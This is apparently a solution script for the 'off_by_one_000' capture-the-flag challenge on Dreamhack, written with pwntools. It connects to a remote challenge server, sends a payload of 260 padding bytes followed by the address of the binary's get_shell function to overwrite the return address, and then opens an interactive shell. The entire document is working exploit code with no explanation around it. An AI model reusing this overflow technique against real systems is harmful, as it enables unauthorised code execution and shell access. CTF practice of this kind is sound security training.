from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8386)
elf = ELF('./off_by_one_000')

get_shell = elf.symbols['get_shell']

payload = b'A'*256
payload += b'B'*4
payload += p32(get_shell)

n.send(payload)


n.interactive()
